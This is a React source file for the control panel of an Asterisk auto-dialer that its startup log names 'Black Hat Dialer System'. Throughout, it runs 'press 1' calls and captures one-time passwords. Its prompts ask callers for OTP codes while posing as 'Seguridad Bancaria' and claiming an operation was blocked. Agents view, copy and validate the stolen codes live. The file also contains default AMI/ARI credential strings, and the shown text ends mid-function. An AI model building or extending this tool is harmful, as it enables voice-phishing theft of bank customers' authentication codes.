import React, { useState, useEffect, useRef, useCallback } from 'react';
import {
  PjsipExtension,
  CarrierTrunk,
  Press1Config,
  OtpCaptureConfig,
  AsteriskConnectionSettings,
  SyncLogEntry,
  AudioPrompt,
  AudioRole,
  ActiveAudioAssignments,
  SystemUser,
  CallCenterTenant,
  EffectiveMembershipStatus,
  MembershipRenewalRequest,
  MembershipSettings,
} from './types';
import {
  initialExtensions,
  initialCarriers,
  initialPress1Config,
  initialOtpConfig,
  initialConnectionSettings,
  initialAudios,
  initialUsers,
  initialTenants,
} from './data/defaultConfig';
import { Header } from './components/Header';
import { Sidebar } from './components/Sidebar';
import { LoginScreen } from './components/LoginScreen';
import { ProductionOperationsTab } from './components/ProductionOperationsTab';
import { ManualDialerTab } from './components/ManualDialerTab';
import { LiveCallsTab } from './components/LiveCallsTab';
import { CallSpyMonitorTab } from './components/CallSpyMonitorTab';
import { ExtensionsTab } from './components/ExtensionsTab';
import { TenantsTab } from './components/TenantsTab';
import { CarriersTab } from './components/CarriersTab';
import { IVRStudioTab } from './components/IVRStudioTab';
import { AudioLibraryTab } from './components/AudioLibraryTab';
import { UsersTab } from './components/UsersTab';
import { ServerTelemetryTab } from './components/ServerTelemetryTab';
import { MembershipTab } from './components/MembershipTab';
import { AmdConfigModal } from './components/AmdConfigModal';
import { isTabAllowedForUser, getDefaultTabForUser } from './utils/rbac';
import { getAuthToken, clearAuthToken, authFetch as fetch } from './utils/authClient';
import { CheckCircle2, AlertCircle, RefreshCw, KeyRound, Copy, Check, X, ShieldAlert, BellRing, Send, PhoneCall } from 'lucide-react';

export default function App() {
  const [activeTab, setActiveTab] = useState<string>(() => {
    try {
      return sessionStorage.getItem('ast20_active_tab') || 'production';
    } catch {
      return 'production';
    }
  });

  // Core Data States with localStorage persistence
  const [extensions, setExtensions] = useState<PjsipExtension[]>(() => {
    const saved = localStorage.getItem('ast20_extensions');
    if (saved) {
      try {
        const parsed = JSON.parse(saved);
        if (Array.isArray(parsed) && parsed.length >= 3) {
          return parsed;
        }
      } catch (e) {}
    }
    return initialExtensions;
  });

  const [carriers, setCarriers] = useState<CarrierTrunk[]>(() => {
    try {
      const saved = localStorage.getItem('ast20_carriers');
      if (saved) {
        const parsed = JSON.parse(saved);
        if (Array.isArray(parsed) && parsed.length > 0) {
          return parsed
            .filter((c: CarrierTrunk) => c && c.name && c.host)
            .map((c: CarrierTrunk): CarrierTrunk => ({
              ...c,
              outboundCallerName: c.outboundCallerName === 'Seguridad Bancaria' ? '' : c.outboundCallerName,
            }));
        }
      }
    } catch (_) {}
    return initialCarriers;
  });

  const [tenants, setTenants] = useState<CallCenterTenant[]>(() => {
    const saved = localStorage.getItem('ast20_tenants');
    if (saved) {
      try {
        const parsed = JSON.parse(saved);
        if (Array.isArray(parsed) && parsed.length > 0) return parsed;
      } catch (_) {}
    }
    return initialTenants;
  });

  const [press1Config, setPress1Config] = useState<Press1Config>(() => {
    const saved = localStorage.getItem('ast20_press1');
    return saved ? JSON.parse(saved) : initialPress1Config;
  });

  const [otpConfig, setOtpConfig] = useState<OtpCaptureConfig>(() => {
    const saved = localStorage.getItem('ast20_otp');
    if (saved) {
      try {
        const parsed = JSON.parse(saved);
        return {
          ...parsed,
          webhookUrl: parsed.webhookUrl?.includes('miempresa.com') ? initialOtpConfig.webhookUrl : parsed.webhookUrl,
        };
      } catch (e) {
        return initialOtpConfig;
      }
    }
    return initialOtpConfig;
  });

  const [connectionSettings, setConnectionSettings] = useState<AsteriskConnectionSettings>(() => {
    const saved = localStorage.getItem('ast20_conn_settings');
    if (saved) {
      try {
        const parsed = JSON.parse(saved);
        // Ensure new credentials apply if user had previous defaults
        return {
          ...parsed,
          amiUser: parsed.amiUser === 'asterisk_admin' ? initialConnectionSettings.amiUser : parsed.amiUser,
          amiSecret: parsed.amiSecret === 'ami_super_secret_key_2026' ? initialConnectionSettings.amiSecret : parsed.amiSecret,
          ariUser: parsed.ariUser === 'ari_stasis_bot' ? initialConnectionSettings.ariUser : parsed.ariUser,
          ariSecret: parsed.ariSecret === 'ari_rest_token_8899' ? initialConnectionSettings.ariSecret : parsed.ariSecret,
        };
      } catch (e) {
        return initialConnectionSettings;
      }
    }
    return initialConnectionSettings;
  });

  // Pre-recorded Audios State
  const [audios, setAudios] = useState<AudioPrompt[]>(() => {
    const saved = localStorage.getItem('ast20_audios');
    return saved ? JSON.parse(saved) : initialAudios;
  });

  // Users & Permissions State (sin credenciales embebidas; autenticadas vía servidor)
  const [users, setUsers] = useState<SystemUser[]>(() => {
    try {
      const saved = localStorage.getItem('ast20_users');
      if (saved) {
        const parsed = JSON.parse(saved);
        if (Array.isArray(parsed) && parsed.length > 0) {
          return parsed.map((u: SystemUser) => {
            const { password: _removed, ...rest } = u;
            return rest as SystemUser;
          });
        }
      }
    } catch (_) {}
    return initialUsers;
  });

  const [currentUserId, setCurrentUserId] = useState<string>(() => {
    const saved = localStorage.getItem('ast20_current_user_id');
    return saved || 'user-admin';
  });

  // Login authentication state: Por seguridad se exige autenticación obligatoria al ingresar al dominio
  const [isAuthenticated, setIsAuthenticated] = useState<boolean>(() => {
    try {
      localStorage.removeItem('ast_session_user_token');
      return false;
    } catch {
      return false;
    }
  });
  const [isRestoringSession, setIsRestoringSession] = useState<boolean>(() => Boolean(getAuthToken()));

  // Theme state: 'light' | 'dark' (Default to 'light' for modern clear, professional appearance)
  const [theme, setTheme] = useState<'light' | 'dark'>(() => {
    const saved = localStorage.getItem('ast20_theme');
    return saved === 'dark' ? 'dark' : 'light';
  });

  const handleToggleTheme = () => {
    setTheme((prev) => {
      const next = prev === 'light' ? 'dark' : 'light';
      try {
        localStorage.setItem('ast20_theme', next);
      } catch (e) {}
      return next;
    });
  };

  useEffect(() => {
    if (!isAuthenticated) {
      document.documentElement.classList.add('theme-dark');
      document.documentElement.classList.remove('theme-light');
      document.body.classList.remove('theme-light');
      document.body.classList.add('theme-dark', 'bg-[#010604]');
      return;
    }
    if (theme === 'light') {
      document.documentElement.classList.add('theme-light');
      document.documentElement.classList.remove('theme-dark');
      document.body.classList.remove('theme-dark', 'bg-[#010604]');
    } else {
      document.documentElement.classList.add('theme-dark');
      document.documentElement.classList.remove('theme-light');
      document.body.classList.add('theme-dark');
      document.body.classList.remove('theme-light');
    }
  }, [theme, isAuthenticated]);
  const [isMobileSidebarOpen, setIsMobileSidebarOpen] = useState<boolean>(false);

  const [isSyncing, setIsSyncing] = useState(false);
  const [isAmdModalOpen, setIsAmdModalOpen] = useState(false);
  const [amdEnabled, setAmdEnabled] = useState<boolean>(true);
  const [isTogglingAmd, setIsTogglingAmd] = useState<boolean>(false);
  const [amdFeedback, setAmdFeedback] = useState<string | null>(null);
  const [toastMessage, setToastMessage] = useState<{ text: string; type: 'success' | 'info' | 'error' } | null>(null);

  useEffect(() => {
    if (!isAuthenticated) return;
    fetch('/api/asterisk/amd/status')
      .then((r) => r.json())
      .then((data) => {
        if (data.success && typeof data.enabled === 'boolean') {
          setAmdEnabled(data.enabled);
        }
      })
      .catch(() => {});
  }, [isAuthenticated]);

  const handleToggleAmd = async () => {
    setIsTogglingAmd(true);
    setAmdFeedback(null);
    try {
      const nextVal = !amdEnabled;
      const res = await fetch('/api/asterisk/amd/toggle', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ enabled: nextVal }),
      });
      const data = await res.json();
      if (data.success) {
        setAmdEnabled(data.enabled);
        setAmdFeedback(data.message || (data.enabled ? 'Detección de grabadora ACTIVADA' : 'Detección de grabadora DESACTIVADA'));
        setTimeout(() => setAmdFeedback(null), 4500);
      }
    } catch (e: any) {
      setAmdFeedback(`Error al alternar AMD: ${e.message}`);
      setTimeout(() => setAmdFeedback(null), 4500);
    } finally {
      setIsTogglingAmd(false);
    }
  };

  // Global OTP Alert monitor across all tabs
  const [globalOtpAlert, setGlobalOtpAlert] = useState<{ id: string; number: string; otp: string; status: string; timestamp: string; agent?: string; service?: string } | null>(null);
  const [globalOtpRecords, setGlobalOtpRecords] = useState<Array<{ id: string; number: string; otp: string; status: 'pending' | 'valid' | 'invalid'; timestamp: string; agent?: string; service?: string; tenantId?: string; channel?: string; createdAt?: number }>>([]);
  const [dismissedOtpKey, setDismissedOtpKey] = useState<string>('');
  const [copiedOtp, setCopiedOtp] = useState<boolean>(false);

  // Centralized live active calls & OTP telemetry monitor across tabs (single polling loop, scoped by tenant & extensions)
  const [globalLiveCalls, setGlobalLiveCalls] = useState<any[]>([]);
  const [globalLiveCallsUpdatedAt, setGlobalLiveCallsUpdatedAt] = useState<number>(Date.now());
  const [activeCallCount, setActiveCallCount] = useState<number>(0);
  const [sendingCancelBannerNum, setSendingCancelBannerNum] = useState<string | null>(null);
  const [dismissedCancelPress1Keys, setDismissedCancelPress1Keys] = useState<string[]>([]);
  const seenGlobalCancelPress1Ref = useRef<Set<string>>(new Set());

  const playGlobalCancelPress1Chime = useCallback(() => {
    if (typeof window === 'undefined') return;
    try {
      const AudioCtx = window.AudioContext || (window as any).webkitAudioContext;
      if (!AudioCtx) return;
      const ctx = new AudioCtx();
      const now = ctx.currentTime;
      [587.33, 783.99, 1046.5].forEach((freq, idx) => {
        const osc = ctx.createOscillator();
        const gain = ctx.createGain();
        osc.type = 'triangle';
        osc.frequency.setValueAtTime(freq, now + idx * 0.11);
        gain.gain.setValueAtTime(0.08, now + idx * 0.11);
        gain.gain.exponentialRampToValueAtTime(0.001, now + idx * 0.11 + 0.22);
        osc.connect(gain);
        gain.connect(ctx.destination);
        osc.start(now + idx * 0.11);
        osc.stop(now + idx * 0.11 + 0.24);
      });
      setTimeout(() => ctx.close().catch(() => {}), 750);
    } catch (_) {}
  }, []);

  const getActiveIsolationScope = useCallback(() => {
    const activeU = users.find((u) => u.id === currentUserId) || users[0];
    const assignedExts = Array.isArray(activeU?.assignedExtensions)
      ? activeU.assignedExtensions.map((x: string) => String(x).trim()).filter(Boolean)
      : [];
    const params = new URLSearchParams();
    if (activeU?.tenantId) params.set('tenantId', activeU.tenantId);
    if (assignedExts.length > 0) params.set('extensions', assignedExts.join(','));
    const qs = params.toString();
    return {
      activeU,
      assignedExts,
      queryString: qs ? `?${qs}` : '',
    };
  }, [users, currentUserId]);

  const isRefreshingTelemetryRef = useRef<boolean>(false);
  const lastLiveCallsSigRef = useRef<string>('');
  const lastOtpRecordsSigRef = useRef<string>('');

  const refreshLiveTelemetry = useCallback(async () => {
    if (isRefreshingTelemetryRef.current) return;
    isRefreshingTelemetryRef.current = true;
    try {
      const { activeU, assignedExts, queryString } = getActiveIsolationScope();
      const [callsRes, otpRes] = await Promise.all([
        fetch(`/api/asterisk/live/calls${queryString}`),
        fetch(`/api/asterisk/otp/records${queryString}`),
      ]);

      if (callsRes.ok) {
        const data = await callsRes.json();
        if (data.success && Array.isArray(data.calls)) {
          const callsSig = data.calls.map((c: any) => `${c.id}:${c.status}:${c.agent}:${c.isOnHold}:${c.otpStatus || ''}:${c.capturedOtp || ''}`).join('|');
          const running = data.calls.filter((c: any) => c.status !== 'ended').length;
          // Only trigger full state re-render if call list/status changed OR calls are active (duration tick)
          if (callsSig !== lastLiveCallsSigRef.current || running > 0) {
            lastLiveCallsSigRef.current = callsSig;
            setGlobalLiveCalls(data.calls);
            setGlobalLiveCallsUpdatedAt(Date.now());
          }
          const cancelPress1Calls = data.calls.filter(
            (c: any) => c.status === 'pressed_1' && c.mode === 'cancel_code' && !c.capturedOtp
          );
          let hasNewCancelPress1 = false;
          cancelPress1Calls.forEach((c: any) => {
            const key = `${c.id || c.number}_press1_cancel`;
            if (!seenGlobalCancelPress1Ref.current.has(key)) {
              seenGlobalCancelPress1Ref.current.add(key);
              hasNewCancelPress1 = true;
            }
          });
          if (hasNewCancelPress1) {
            playGlobalCancelPress1Chime();
          }
          setActiveCallCount((prev) => (prev === running ? prev : running));
        }
      }

      if (otpRes.ok) {
        const otpData = await otpRes.json();
        if (otpData.success && Array.isArray(otpData.records)) {
          let recs = otpData.records;
          if (activeU?.tenantId) {
            recs = recs.filter((r: any) => !r.tenantId || r.tenantId === activeU.tenantId);
          }
          if (assignedExts.length > 0) {
            recs = recs.filter((r: any) => {
              const recAgent = r.agent ? String(r.agent).trim() : '';
              if (recAgent) return assignedExts.includes(recAgent);
              const recNum = r.number ? String(r.number).trim() : '';
              return recNum ? assignedExts.includes(recNum) : false;
            });
          }
          const otpSig = recs.map((r: any) => `${r.id}:${r.otp}:${r.status}:${r.agent || ''}`).join('|');
          if (otpSig !== lastOtpRecordsSigRef.current) {
            lastOtpRecordsSigRef.current = otpSig;
            setGlobalOtpRecords(recs);
          }
          if (recs.length > 0) {
            const newest = recs[0];
            const alertKey = `${newest.id}_${newest.otp}`;
            if (newest && newest.otp && alertKey !== dismissedOtpKey) {
              setGlobalOtpAlert((prev) => {
                if (prev && prev.id === newest.id && prev.otp === newest.otp && prev.status === newest.status) {
                  return prev;
                }
                return newest;
              });
            }
          } else {
            setGlobalOtpAlert((prev) => (prev === null ? prev : null));
          }
        }
      }
    } catch (_) {}
    finally {
      isRefreshingTelemetryRef.current = false;
    }
  }, [getActiveIsolationScope, dismissedOtpKey]);

  useEffect(() => {
    if (!isAuthenticated) return;
    const poll = () => {
      if (typeof document !== 'undefined' && document.hidden) return;
      refreshLiveTelemetry();
    };
    poll();
    const intervalMs =
      activeCallCount > 0 || activeTab === 'live-calls' || activeTab === 'call-spy'
        ? 3500
        : 8000;
    const interval = setInterval(poll, intervalMs);
    return () => clearInterval(interval);
  }, [isAuthenticated, refreshLiveTelemetry, activeTab, activeCallCount]);

  const handleCopyOtp = (otp: string) => {
    navigator.clipboard.writeText(otp);
    setCopiedOtp(true);
    setTimeout(() => setCopiedOtp(false), 2000);
  };

  const handleGlobalCancelCodeSent = async (number: string, agent?: string) => {
    setSendingCancelBannerNum(number);
    try {
      const res = await fetch('/api/asterisk/call/cancel-code-sent', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          number,
          agent: agent && agent !== 'ringall' ? agent : undefined,
        }),
      });
      if (res.ok) {
        setGlobalLiveCalls((prev) =>
          prev.map((c) =>
            c.number === number
              ? { ...c, status: 'asking_cancel_code', statusText: 'Solicitando al cliente digitar el código' }
              : c
          )
        );
        refreshLiveTelemetry();
      }
    } catch (_) {}
    finally {
      setSendingCancelBannerNum(null);
    }
  };

  const handleQuickOtpDecision = async (
    status: 'valid' | 'invalid',
    target?: { id?: string; number: string; otp: string; agent?: string }
  ): Promise<{ success: boolean; error?: string }> => {
    const resolved = target || globalOtpAlert;
    if (!resolved) return { success: false, error: 'No hay código OTP seleccionado.' };

    const cleanAgent = resolved.agent && resolved.agent !== 'ringall' ? resolved.agent : undefined;
    const matchRecord = (r: { id?: string; number: string; otp: string }) =>
      (resolved.id && r.id === resolved.id) || (r.number === resolved.number && r.otp === resolved.otp);

    // Immediate optimistic update of global state (banner + global records)
    setGlobalOtpRecords((prev) =>
      prev.map((r) => (matchRecord(r) ? { ...r, status } : r))
    );
    setGlobalOtpAlert((prev) => {
      if (!prev) return null;
      return matchRecord(prev) ? { ...prev, status } : prev;
    });

    try {
      const res = await fetch('/api/asterisk/otp/decision', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          id: resolved.id,
          number: resolved.number,
          otp: resolved.otp,
          agent: cleanAgent,
          status,
          action: status === 'invalid' ? 'request_retry' : undefined,
        }),
      });
      const data = await res.json().catch(() => ({}));
      if (!res.ok || data.success === false) {
        return { success: false, error: data.error || 'Error al registrar decisión OTP.' };
      }

      if (status === 'valid' && globalOtpAlert && matchRecord(globalOtpAlert)) {
        const alertKey = `${globalOtpAlert.id}_${globalOtpAlert.otp}`;
        setTimeout(() => {
          setDismissedOtpKey(alertKey);
          setGlobalOtpAlert((curr) => (curr && `${curr.id}_${curr.otp}` === alertKey ? null : curr));
        }, 1800);
      }
      return { success: true };
    } catch (e: any) {
      console.warn('Error sending quick OTP decision:', e);
      return { success: false, error: e?.message || 'Error de conexión con el servidor.' };
    }
  };

  // Active Asterisk Audio Assignments
  const [activeAudioAssignments, setActiveAudioAssignments] = useState<ActiveAudioAssignments>({
    press1_welcome: 'custom/bienvenida_corporativa',
    agent_transfer: 'custom/conectar_asesor',
    press1_invalid: 'custom/opcion_invalida',
    otp_welcome: 'custom/solicitar_codigo_otp',
    otp_wait: 'custom/un_momento_validando_informacion',
    otp_success: 'custom/operacion_bloqueada_exito',
    otp_failure: 'custom/token_invalido_reintente',
    hold_music: 'default',
  });

  // Manual Locks State for IVR Script/Entity & Dynamic OTP Extensions (4001+)
  const [manualLocks, setManualLocks] = useState<{
    ivr_entity: boolean;
    [key: string]: boolean | undefined;
  }>(() => {
    try {
      const saved = localStorage.getItem('ast20_audio_locks_ui');
      if (saved) return JSON.parse(saved);
    } catch (_) {}
    return {
      ivr_entity: false,
    };
  });

  const handleToggleManualLock = (role: string, isLocked: boolean) => {
    setManualLocks((prev) => {
      const next = { ...prev, [role]: isLocked };
      try { localStorage.setItem('ast20_audio_locks_ui', JSON.stringify(next)); } catch (_) {}
      return next;
    });
    fetch('/api/asterisk/audio/toggle-lock', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ role, isLocked }),
    }).catch(() => {});
  };

  // Centralized Cross-Browser and Cross-Device Synchronization per User
  const isApplyingRemoteUpdateRef = useRef(false);
  const isStateLoadedRef = useRef(false);
  const lastServerTimestampRef = useRef(0);
  const lastUserStateVersionRef = useRef<number>(-1);
  const isFetchingUserStateRef = useRef<boolean>(false);

  const currentUser = users.find((u) => u.id === currentUserId) || users[0];

  // RBAC Access Control Guard: Automatically redirect if current user lacks permission for activeTab
  useEffect(() => {
    if (currentUser && !isTabAllowedForUser(activeTab, currentUser)) {
      setActiveTab(getDefaultTabForUser(currentUser));
    }
  }, [currentUser, activeTab]);

  const fetchUserState = useCallback(async (targetUserId?: string, targetUsername?: string, forceFull = false) => {
    if (isFetchingUserStateRef.current) return;
    isFetchingUserStateRef.current = true;
    try {
      const uId = targetUserId || currentUserId || 'user-admin';
      const uName = targetUsername || currentUser?.username || 'admin';
      const qs = `userId=${encodeURIComponent(uId)}&username=${encodeURIComponent(uName)}`;

      // Check 30-byte file mtime version first so idle polls never download or parse full user-state
      let latestVersion = -1;
      if (isStateLoadedRef.current && !forceFull) {
        try {
          const verRes = await fetch(`/api/app/user-state/version?${qs}`);
          if (verRes.ok) {
            const verData = await verRes.json();
            if (typeof verData?.version === 'number') {
              latestVersion = verData.version;
              if (latestVersion > 0 && latestVersion === lastUserStateVersionRef.current) {
                return;
              }
            }
          }
        } catch (_) {}
      }

      const res = await fetch(`/api/app/user-state?${qs}`);
      if (!res.ok) {
        isStateLoadedRef.current = true;
        return;
      }
      const data = await res.json();
      if (latestVersion > 0) {
        lastUserStateVersionRef.current = latestVersion;
      } else {
        // Sync version baseline immediately after initial load so subsequent polls use 30-byte check
        fetch(`/api/app/user-state/version?${qs}`)
          .then((r) => (r.ok ? r.json() : null))
          .then((vd) => {
            if (typeof vd?.version === 'number' && vd.version > 0) {
              lastUserStateVersionRef.current = vd.version;
            }
          })
          .catch(() => {});
      }

      if (data.success && data.state) {
        const s = data.state;
        if (s.lastUpdated && s.lastUpdated <= lastServerTimestampRef.current && isStateLoadedRef.current) {
          return;
        }
        lastServerTimestampRef.current = s.lastUpdated || Date.now();
        isApplyingRemoteUpdateRef.current = true;
        isStateLoadedRef.current = true;

        if (Array.isArray(s.extensions) && s.extensions.length > 0) {
          setExtensions(s.extensions);
          try { localStorage.setItem('ast20_extensions', JSON.stringify(s.extensions)); } catch (e) {}
        }
        if (Array.isArray(s.carriers) && s.carriers.length > 0) {
          setCarriers(s.carriers);
          try { localStorage.setItem('ast20_carriers', JSON.stringify(s.carriers)); } catch (e) {}
        }
        if (s.press1Config) {
          setPress1Config((prev) => {
            if (prev.isLocked && !s.press1Config.isLocked) return prev;
            try { localStorage.setItem('ast20_press1', JSON.stringify(s.press1Config)); } catch (e) {}
            return s.press1Config;
          });
        }
        if (s.otpConfig) {
          setOtpConfig((prev) => {
            if (prev.isLocked && !s.otpConfig.isLocked) return prev;
            try { localStorage.setItem('ast20_otp', JSON.stringify(s.otpConfig)); } catch (e) {}
            return s.otpConfig;
          });
        }
        if (Array.isArray(s.audios) && s.audios.length > 0) {
          setAudios(s.audios);
          try { localStorage.setItem('ast20_audios', JSON.stringify(s.audios)); } catch (e) {}
        }
        if (Array.isArray(s.users) && s.users.length > 0) {
          setUsers(s.users);
          try { localStorage.setItem('ast20_users', JSON.stringify(s.users)); } catch (e) {}
        }
        if (s.connectionSettings) {
          setConnectionSettings(s.connectionSettings);
          try { localStorage.setItem('ast20_conn_settings', JSON.stringify(s.connectionSettings)); } catch (e) {}
        }
        if (s.theme) {
          setTheme(s.theme);
          try { localStorage.setItem('ast20_theme', s.theme); } catch (e) {}
        }

        setTimeout(() => {
          isApplyingRemoteUpdateRef.current = false;
        }, 400);
      } else {
        isStateLoadedRef.current = true;
      }
    } catch (err) {
      isStateLoadedRef.current = true;
    } finally {
      isFetchingUserStateRef.current = false;
    }
  }, [currentUserId, currentUser?.username]);

  // Poll lightweight user-state version every 12s and on window focus
  useEffect(() => {
    if (!isAuthenticated) return;
    fetchUserState();
    const interval = setInterval(() => {
      if (typeof document !== 'undefined' && document.hidden) return;
      fetchUserState();
    }, 12000);
    const handleFocus = () => fetchUserState();
    window.addEventListener('focus', handleFocus);
    return () => {
      clearInterval(interval);
      window.removeEventListener('focus', handleFocus);
    };
  }, [isAuthenticated, fetchUserState]);

  // Synchronize changes made in other tabs of the same browser via storage event
  useEffect(() => {
    const handleStorageChange = (e: StorageEvent) => {
      if (!e.key || isApplyingRemoteUpdateRef.current) return;
      try {
        if (e.key === 'ast20_extensions' && e.newValue) setExtensions(JSON.parse(e.newValue));
        if (e.key === 'ast20_carriers' && e.newValue) setCarriers(JSON.parse(e.newValue));
        if (e.key === 'ast20_press1' && e.newValue) {
          const parsed = JSON.parse(e.newValue);
          setPress1Config((prev) => (prev.isLocked && !parsed.isLocked ? prev : parsed));
        }
        if (e.key === 'ast20_otp' && e.newValue) {
          const parsed = JSON.parse(e.newValue);
          setOtpConfig((prev) => (prev.isLocked && !parsed.isLocked ? prev : parsed));
        }
        if (e.key === 'ast20_audios' && e.newValue) setAudios(JSON.parse(e.newValue));
        if (e.key === 'ast20_users' && e.newValue) setUsers(JSON.parse(e.newValue));
        if (e.key === 'ast20_conn_settings' && e.newValue) setConnectionSettings(JSON.parse(e.newValue));
        if (e.key === 'ast20_audio_locks_ui' && e.newValue) setManualLocks(JSON.parse(e.newValue));
      } catch (err) {}
    };
    window.addEventListener('storage', handleStorageChange);
    return () => window.removeEventListener('storage', handleStorageChange);
  }, []);

  // Debounced push to server when user modifies local state - ONLY after initial state loaded to avoid clobbering with defaults
  useEffect(() => {
    if (!isAuthenticated || isApplyingRemoteUpdateRef.current || !isStateLoadedRef.current) return;
    const timer = setTimeout(async () => {
      try {
        const payload = {
          extensions,
          carriers,
          press1Config,
          otpConfig,
          audios,
          users,
          connectionSettings,
          theme,
        };
        const res = await fetch('/api/app/user-state', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            userId: currentUser.id,
            username: currentUser.username,
            state: payload,
          }),
        });
        if (res.ok) {
          const d = await res.json();
          if (d.lastUpdated) {
            lastServerTimestampRef.current = d.lastUpdated;
          }
          // Refresh known version so we don't re-fetch our own write
          fetch(`/api/app/user-state/version?userId=${encodeURIComponent(currentUser.id)}&username=${encodeURIComponent(currentUser.username)}`)
            .then((r) => (r.ok ? r.json() : null))
            .then((vd) => {
              if (typeof vd?.version === 'number' && vd.version > 0) {
                lastUserStateVersionRef.current = vd.version;
              }
            })
            .catch(() => {});
        }
      } catch (err) {}
    }, 1200);

    return () => clearTimeout(timer);
  }, [isAuthenticated, extensions, carriers, press1Config, otpConfig, audios, users, connectionSettings, theme, currentUser.id, currentUser.username]);

  useEffect(() => {
    if (!isAuthenticated) return;
    fetch('/api/asterisk/audio/active-assignments')
      .then((r) => r.json())
      .then((data) => {
        if (data.success && data.assignments) {
          setActiveAudioAssignments(data.assignments);
          if (data.manualLocks) {
            setManualLocks((prev) => ({
              ...prev,
              ...data.manualLocks,
              ivr_entity: prev.ivr_entity || !!data.manualLocks.ivr_entity,
            }));
          }
        }
      })
      .catch(() => {});

    // Fetch live Asterisk extensions on startup to ensure 100% synchronization
    fetch('/api/asterisk/extensions')
      .then((r) => r.json())
      .then((data) => {
        if (data.success && Array.isArray(data.extensions) && data.extensions.length > 0) {
          setExtensions(data.extensions);
          try {
            localStorage.setItem('ast20_extensions', JSON.stringify(data.extensions));
          } catch (e) {}
        }
      })
      .catch(() => {});
  }, [isAuthenticated]);

  const handleAssignRole = async (role: AudioRole, asteriskPath: string) => {
    setActiveAudioAssignments((prev) => ({ ...prev, [role]: asteriskPath }));
    try {
      const res = await fetch('/api/asterisk/audio/assign', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ role, asteriskPath }),
      });
      const data = await res.json();
      if (data.success && data.assignments) {
        setActiveAudioAssignments(data.assignments);
      }
      showToast(`Audio "${asteriskPath}" asignado al rol "${role}".`);
      addLog('AMI', `[AUDIO LIVE] Rol ${role} actualizado a ${asteriskPath}`, `AstDB actualizado.`);
    } catch (e) {
      showToast(`Error al asignar audio en Asterisk`);
    }
  };

  // Sync Telemetry Logs
  const [logs, setLogs] = useState<SyncLogEntry[]>([
    {
      id: 'log-1',
      timestamp: '17:20:00',
      type: 'SYSTEM',
      message: 'Black Hat Dialer System inicializado. Regla activa: Extensiones 1001 en adelante.',
      status: 'success',
    },
    {
      id: 'log-2',
      timestamp: '17:20:01',
      type: 'AMI',
      message: 'Conectado a Asterisk Manager Interface en 127.0.0.1:5038',
      payload: 'Asterisk Call Manager/9.0.0\nResponse: Success\nMessage: Authentication accepted',
      status: 'success',
    },
    {
      id: 'log-3',
      timestamp: '17:20:02',
      type: 'ARI',
      message: 'Canal WebSocket ARI conectado en puerto 8088',
      payload: 'Stasis Application registered: otp_verification_app',
      status: 'success',
    },
    {
      id: 'log-4',
      timestamp: '17:20:03',
      type: 'SYSTEM',
      message: 'Audioteca cargada con 5 locuciones pregrabadas en /var/lib/asterisk/sounds/custom/',
      status: 'success',
    },
  ]);

  // Persist to localStorage
  useEffect(() => {
    localStorage.setItem('ast20_extensions', JSON.stringify(extensions));
  }, [extensions]);

  useEffect(() => {
    localStorage.setItem('ast20_carriers', JSON.stringify(carriers));
  }, [carriers]);

  useEffect(() => {
    localStorage.setItem('ast20_press1', JSON.stringify(press1Config));
  }, [press1Config]);

  useEffect(() => {
    localStorage.setItem('ast20_otp', JSON.stringify(otpConfig));
  }, [otpConfig]);

  useEffect(() => {
    localStorage.setItem('ast20_conn_settings', JSON.stringify(connectionSettings));
  }, [connectionSettings]);

  useEffect(() => {
    localStorage.setItem('ast20_audios', JSON.stringify(audios));
  }, [audios]);

  useEffect(() => {
    localStorage.setItem('ast20_users', JSON.stringify(users));
  }, [users]);

  useEffect(() => {
    localStorage.setItem('ast20_current_user_id', currentUserId);
  }, [currentUserId]);

  const isTenantsHydratedRef = useRef(false);
  const lastSavedTenantsJsonRef = useRef<string>('');
  const serializeTenantsCore = (list: CallCenterTenant[]) =>
    JSON.stringify(
      list.map((t) => {
        const { effectiveMembership: _em, membership: _m, ...rest } = t as any;
        return rest;
      })
    );

  useEffect(() => {
    if (!isAuthenticated) {
      isTenantsHydratedRef.current = false;
      return;
    }
    fetch('/api/tenants')
      .then((r) => r.json())
      .then((data) => {
        if (data.success && Array.isArray(data.tenants) && data.tenants.length > 0) {
          lastSavedTenantsJsonRef.current = serializeTenantsCore(data.tenants);
          setTenants(data.tenants);
        } else if (currentUser?.role === 'admin' && !currentUser?.tenantId) {
          lastSavedTenantsJsonRef.current = serializeTenantsCore(tenants);
          fetch('/api/tenants', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ tenants, carriers, extensions }),
          }).catch(() => {});
        }
      })
      .catch(() => {})
      .finally(() => {
        isTenantsHydratedRef.current = true;
      });
  }, [isAuthenticated]);

  useEffect(() => {
    const serializedAll = JSON.stringify(tenants);
    const serializedCore = serializeTenantsCore(tenants);
    localStorage.setItem('ast20_tenants', serializedAll);
    if (
      isAuthenticated &&
      isTenantsHydratedRef.current &&
      currentUser?.role === 'admin' &&
      !currentUser?.tenantId &&
      serializedCore !== lastSavedTenantsJsonRef.current
    ) {
      lastSavedTenantsJsonRef.current = serializedCore;
      fetch('/api/tenants', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ tenants, carriers, extensions }),
      }).catch(() => {});
    }
  }, [tenants, isAuthenticated]);

  // Call Center Tenants Handlers
  const handleAddTenant = async (
    newTenant: CallCenterTenant,
    activationMode?: 'initial_month' | 'demo_1_day' | 'none' | boolean
  ) => {
    const resolvedMode: 'initial_month' | 'demo_1_day' | 'none' =
      activationMode === true
        ? 'initial_month'
        : activationMode === 'initial_month' || activationMode === 'demo_1_day'
        ? activationMode
        : 'none';

    const updatedList = [newTenant, ...tenants];
    if (resolvedMode !== 'none' && currentUser?.role === 'admin' && !currentUser?.tenantId) {
      lastSavedTenantsJsonRef.current = serializeTenantsCore(updatedList);
    }
    setTenants(updatedList);
    addLog(
      'SYSTEM',
      `Nuevo Grupo de Call Center creado: "${newTenant.name}" (Rango ${newTenant.extensionStart}-${newTenant.extensionEnd}, Contexto [${newTenant.dialplanContext}])`,
